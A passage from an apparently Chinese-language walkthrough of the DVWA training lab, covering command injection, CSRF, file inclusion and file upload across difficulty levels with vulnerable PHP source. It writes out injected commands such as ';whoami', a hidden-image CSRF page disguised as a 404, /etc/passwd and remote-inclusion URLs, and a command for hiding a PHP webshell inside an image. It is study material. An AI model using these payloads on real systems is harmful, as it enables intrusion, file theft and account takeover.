minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;<br><br>        <span class="hljs-comment">// Update bad login count</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    &#125;<br><br>    <span class="hljs-comment">// Set the last login time</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这一次的源码要长很多，看起来很安全，分析一下。</p><p>这次限制了登录的失败次数为3，锁定的时间默认为15分钟（实际是last_login+lockout_time）。</p><p>如果超过了3次失败，账户将会锁定。</p><p>并且添加了pdo机制，爆破和sql注入看起来很艰难。</p><p>但总觉得可能会有爆破的方式，尝试去网上查找，最后在知乎找到了一篇<a href="https://zhuanlan.zhihu.com/p/126639909">大佬的文章</a>，我也跟着做了一遍，结果失败了，暂未找到失败的原因。</p><h1 id="三、command-injection（命令注入）"><a href="#三、command-injection（命令注入）" class="headerlink" title="三、command injection（命令注入）"></a>三、command injection（命令注入）</h1><p>以前比较擅长这个（因为简单），太久没搞了，复习一下。</p><blockquote><p><strong>命令执行</strong>是指攻击者通过浏览器或者其他客户端软件提交一些cmd命令（或者bash命令）至服务器程序，服务器程序通过system、eval、exec等函数直接或者间接地调用cmd.exe执行攻击者提交的命令。          </p></blockquote><p>界面：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629100902545.png" alt="image-20210629100902545"></p><h2 id="1-low-1"><a href="#1-low-1" class="headerlink" title="1.low"></a>1.low</h2><p>输入框提示输入ip地址，标题写着ping a device，很明显是ping命令。</p><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629101516837.png" alt="image-20210629101516837"></p><p>查看源码发现没有任何过滤，输入ip后会ping4次包，命令。</p><p>使用连接符，可以让输入执行几条命令。</p><blockquote><p><strong>常见连接符</strong></p><p>A;B    先执行A，再执行B<br>A&amp;B    简单拼接，A B之间无制约关系<br>A|B    显示B的执行结果<br>A&amp;&amp;B   A执行成功，然后才会执行B<br>A||B   A执行失败，然后才会执行B</p></blockquote><p>尝试查看当前目录文件：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-comment">;ls</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629102717387.png" alt="image-20210629102717387"></p><p>查看上一层目录文件：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">;<span class="hljs-keyword">ls</span> <span class="hljs-string">../</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629102807547.png" alt="image-20210629102807547"></p><p>还有一些其他的命令都可以执行。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cmd">#当前用户名<br>;whoami<br>#查看文件<br>;cat xxx<br>#查看版本<br>;uname -a<br></code></pre></td></tr></table></figure><h2 id="2-medium-1"><a href="#2-medium-1" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629104132920.png" alt="image-20210629104132920"></p><p>源码对一些符号做了过滤，&amp;&amp;和;会被过滤掉。</p><p>但其他的连接符仍旧可以使用，例如|、||、&amp;。</p><h2 id="3-high-1"><a href="#3-high-1" class="headerlink" title="3.high"></a>3.high</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629104639549.png" alt="image-20210629104639549"></p><p>对大部分的符号进行了过滤，很奇怪并没有过滤字符串。</p><p>这里还有个很离奇的点，过滤的符号不是｜而是｜+空格，所以仍旧可以使用｜做连接符。</p><p>但这样的题目总让人感觉怪怪的。</p><h2 id="4-impossible-1"><a href="#4-impossible-1" class="headerlink" title="4.impossible"></a>4.impossible</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629110648951.png" alt="image-20210629110648951"></p><p>又是要检查token，防止csrf。</p><p>传入的参数以.为分割，并检测是否为数字，检测成功后重新再组成ip地址。</p><p>看起来是很难有方法能够绕过了。</p><h1 id="四、csrf（跨站请求伪造）"><a href="#四、csrf（跨站请求伪造）" class="headerlink" title="四、csrf（跨站请求伪造）"></a>四、csrf（跨站请求伪造）</h1><blockquote><p>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p><p>CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。</p></blockquote><h2 id="1-low-2"><a href="#1-low-2" class="headerlink" title="1.low"></a>1.low</h2><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629114943931.png" alt="image-20210629114943931"></p><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629115142907.png" alt="image-20210629115142907"></p><p>get两个值，判断password_new和password_conf是否相等，相等则在数据库更新当前用户的密码。</p><p>没有其他的验证机制。</p><p><strong>构造链接：</strong></p><p><a href="http://127.0.0.1/vulnerabilities/csrf/?password_new=111&password_conf=111&Change=Change#">http://127.0.0.1/vulnerabilities/csrf/?password_new=111&amp;password_conf=111&amp;Change=Change#</a></p><p>只要访问这个链接，密码就会被改成111。</p><p>不过这个链接太明显了，可以使用<strong>短链接</strong>进行伪装。</p><p>也可以选择构造攻击页面去诱导受害者访问。</p><blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;[http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#](http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#)&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>/&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>file not found.<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span> <br>  <br>————————<br> 来源：https://www.jianshu.com/p/e65ede7d7026<br></code></pre></td></tr></table></figure></blockquote><h2 id="2-medium-2"><a href="#2-medium-2" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629120339916.png" alt="image-20210629120339916"></p><p>eregi（）函数是用指定的模式搜索一个字符串中指定的字符串，如果匹配成功返回true，反之返回false。</p><p>关于<code>if( eregi( $_SERVER[ &#39;SERVER_NAME&#39; ], $_SERVER[ &#39;HTTP_REFERER&#39; ] ) )</code>:</p><blockquote><p>百度百科：</p><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p></blockquote><p><strong>$_SERVER[‘HTTP_REFERER’]</strong> 就是链接到当前页面的前一页面的 URL 地址，也就是源地址。 </p><p>**$_SERVER[‘SERVER_NAME’]**则为主机名（例如127.0.0.1），也就是受害者的ip。</p><p>所以是检查源地址中是否包含主机名，所以构造的url必须要包含主机名。</p><p>和low一样，先更改密码形成链接。</p><p>然后换一个浏览器打开链接，显示request不正确。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629142330630.png" alt="image-20210629142330630"></p><details><summary><p>对比在原页面和新页面抓包到的内容，确实有不同，新页面并没有referer。</p></summary><p>原：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629143700817.png" alt="image-20210629143700817"></p><p>新：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629143829526.png" alt="image-20210629143829526"></p></details><p>因为eregi（）验证为false所以导致出现错误。</p><p>所以写一个攻击页面。</p><p><strong>文件名和内部链接的ip均为被攻击的ip</strong>（例如127.0.0.1）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://127.0.0.1/vulnerabilities/csrf/?password_new=3333&amp;password_conf=3333&amp;Change=Change#&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>/&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>file not found.<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span> <br></code></pre></td></tr></table></figure><p>访问，出现了迷惑性质的提示。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629170441299.png" alt="image-20210629170441299"></p><p>尝试用修改的密码登录，成功！</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629170724287.png" alt="image-20210629170724287"></p><h2 id="3-high-2"><a href="#3-high-2" class="headerlink" title="3.high"></a>3.high</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629170830488.png" alt="image-20210629170830488"></p><p>增加了token的验证。</p><p>先提交修改一下密码，url出现了token，结合源码，应该是要验证token是否相同。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630103301622.png" alt="image-20210630103301622"></p><p>必须要获得用户的token，再提交表单，这一点看上去很难搞。</p><p>经过了一番查询后发现，居然可以用xss结合起来，使用xss获得用户的token。</p><p>这个等到xss高级的时候再一起来看吧。</p><h2 id="4-impossible-2"><a href="#4-impossible-2" class="headerlink" title="4.impossible"></a>4.impossible</h2><p>界面增加了原来密码的验证。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630114602196.png" alt="image-20210630114602196"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_current&#x27;</span> ];<br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Sanitise current password input</span><br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass_curr</span> );<br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>( <span class="hljs-variable">$pass_curr</span> );<br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_curr</span> );<br><br>    <span class="hljs-comment">// Check that the current password is correct</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>(), PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$pass_curr</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><br>    <span class="hljs-comment">// Do both new passwords match and does the current password match the user?</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &amp;&amp; ( <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">rowCount</span>() == <span class="hljs-number">1</span> ) ) &#123;<br>        <span class="hljs-comment">// It does!</span><br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass_new</span> );<br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>( <span class="hljs-variable">$pass_new</span> );<br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update database with new password</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$pass_new</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>(), PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><br>        <span class="hljs-comment">// Feedback for the user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>直接要求验证原密码+token验证，攻击者不知道原密码就没法子csrf。</p><h1 id="五、file-inclusion（文件包含）"><a href="#五、file-inclusion（文件包含）" class="headerlink" title="五、file inclusion（文件包含）"></a>五、file inclusion（文件包含）</h1><p>文件包含介绍：</p><blockquote><p><strong>文件包含</strong></p><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p><p><strong>漏洞产生原因</strong></p><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p></blockquote><p>界面：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630141520524.png" alt="image-20210630141520524"></p><p>有三个文件。</p><p>File1:用户名、ip</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630142212280.png" alt="image-20210630142212280"></p><p>File2:</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630142309828.png" alt="image-20210630142309828"></p><p>File3:存在很多敏感信息。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630142350352.png" alt="image-20210630142350352"></p><p>File4:隐藏文件。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630144247278.png" alt="image-20210630144247278"></p><h2 id="1-low-3"><a href="#1-low-3" class="headerlink" title="1.low"></a>1.low</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630142723198.png" alt="image-20210630142723198"></p><p>url：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/vulnerabilities/</span>fi/?page=include.php<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/vulnerabilities/</span>fi/?page=file1.php<br></code></pre></td></tr></table></figure><p>源码很简单，直接get指定的文件名赋值给file，没有任何防护。</p><p>尝试访问passwd文件，也是可行的。（访问敏感信息）</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630144703536.png" alt="image-20210630144703536"></p><p>甚至可以远程包含。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/vulnerabilities/</span>fi<span class="hljs-regexp">/?page=http:/</span><span class="hljs-regexp">/xx.xx.xx.xx/</span><span class="hljs-number">1</span>.php<br></code></pre></td></tr></table></figure><h2 id="2-medium-3"><a href="#2-medium-3" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630153408797.png" alt="image-20210630153408797"></p><p>http:&#x2F;&#x2F;和https:&#x2F;&#x2F; 被str_replace过滤。</p><p>..&#x2F;和..\也被过滤。</p><p>但str_replace只能过滤一次，所以可以使用双写绕过。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630154941333.png" alt="image-20210630154941333"></p><p>本地文件&#x2F;etc&#x2F;passwd仍旧可以访问。</p><h2 id="3-high-3"><a href="#3-high-3" class="headerlink" title="3.high"></a>3.high</h2><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630155430279.png" alt="image-20210630155430279"></p><p>fnmatch（）函数是根据指定的模式来匹配文件名和字符串。</p><p>意思是必须file开头的文件和include.php。</p><p>也就意味着可以使用file:&#x2F;&#x2F;协议（关于<a href="https://www.php.net/manual/zh/wrappers.php.php">php伪协议</a>）。</p><p>例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/vulnerabilities/</span>fi<span class="hljs-regexp">/?page=file:/</span><span class="hljs-regexp">//</span>etc/passwd<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630162308195.png" alt="image-20210630162308195"></p><p>但file协议无法支持远程文件执行，只可以进行本地文件读取。</p><h2 id="4-impossible-3"><a href="#4-impossible-3" class="headerlink" title="4.impossible"></a>4.impossible</h2><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630163051152.png" alt="image-20210630163051152"></p><p>直接限制文件，只能是include.php、file1-3.php。</p><h1 id="六、file-upload（文件上传）"><a href="#六、file-upload（文件上传）" class="headerlink" title="六、file upload（文件上传）"></a>六、file upload（文件上传）</h1><h2 id="1-low-4"><a href="#1-low-4" class="headerlink" title="1.low"></a>1.low</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630170841603.png" alt="image-20210630170841603"></p><p>没有任何过滤机制。</p><p>尝试上传文件，成功。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630170815030.png" alt="image-20210630170815030"></p><h2 id="2-medium-4"><a href="#2-medium-4" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630171124024.png" alt="image-20210630171124024"></p><p>会检查文件的类型，只有<strong>content-type</strong>为image&#x2F;jpeg和image&#x2F;png会成功上传，并且大小要小于100000。</p><p>但对文件的后缀和内容完全没有检测。</p><p>上传php文件，抓包，修改content-type为白名单的类型名。</p><p>显示上传成功。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630171633004.png" alt="image-20210630171633004"></p><p>访问一下，可以正常访问。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630172124237.png" alt="image-20210630172124237"></p><h2 id="3-high-4"><a href="#3-high-4" class="headerlink" title="3.high"></a>3.high</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630172245715.png" alt="image-20210630172245715"></p><p>strrpos（）返回指定字符最后一次出现的位置。</p><p>以文件名最后一个点切割文件名，检测文件名后缀是否为<strong>jpg</strong>或<strong>jpeg</strong>或<strong>png</strong>。</p><p>看到这个我第一反应就是00截断。</p><p>尝试着上传了一个命名为1.jpg但内容为111的文件，显示上传失败。上传普通的图片却可以成功。</p><p>仔细看了下，原来是有<strong>getimagesize（）</strong>，该函数会检查图片的类型大小。</p><p>所以使用copy拼接马与图片。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">copy /<span class="hljs-selector-tag">b</span> <span class="hljs-selector-tag">a</span>.jpg+<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.php</span> c.jpg<br></code></pre></td></tr></table></figure><p>而00截断也因为php实验版本环境过高而无法展开，所以直接上传jpg文件，使用。</p><p>file uoload的high等级并没有限制file:&#x2F;&#x2F;协议，所以文件引用后用菜刀或蚁剑对其进行连接。</p><h2 id="4-impossible-4"><a href="#4-impossible-4" class="headerlink" title="4.impossible"></a>4.impossible</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"><br>&lt;?php<br><br>if( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123;<br>    // Check Anti-CSRF token<br>    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );<br><br><br>    // File information<br>    $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ];<br>    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1);<br>    $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ];<br>    $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ];<br>    $uploaded_tmp  = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ];<br><br>    // Where are we going to be writing to?<br>    $target_path   = DVWA_WEB_PAGE_TO_ROOT . &#x27;hackable/uploads/&#x27;;<br>    //$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;<br>    $target_file   =  md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext;<br>    $temp_file     = ( ( ini_get( &#x27;upload_tmp_dir&#x27; ) == &#x27;&#x27; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#x27;upload_tmp_dir&#x27; ) ) );<br>    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext;<br><br>    // Is it an image?<br>    if( ( strtolower( $uploaded_ext ) == &#x27;jpg&#x27; || strtolower( $uploaded_ext ) == &#x27;jpeg&#x27; || strtolower( $uploaded_ext ) == &#x27;png&#x27; ) &amp;&amp;<br>        ( $uploaded_size &lt; 100000 ) &amp;&amp;<br>        ( $uploaded_type == &#x27;image/jpeg&#x27; || $uploaded_type == &#x27;image/png&#x27; ) &amp;&amp;<br>        getimagesize( $uploaded_tmp ) ) &#123;<br><br>        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)<br>        if( $uploaded_type == &#x27;image/jpeg&#x27; ) &#123;<br>            $img = imagecreatefromjpeg( 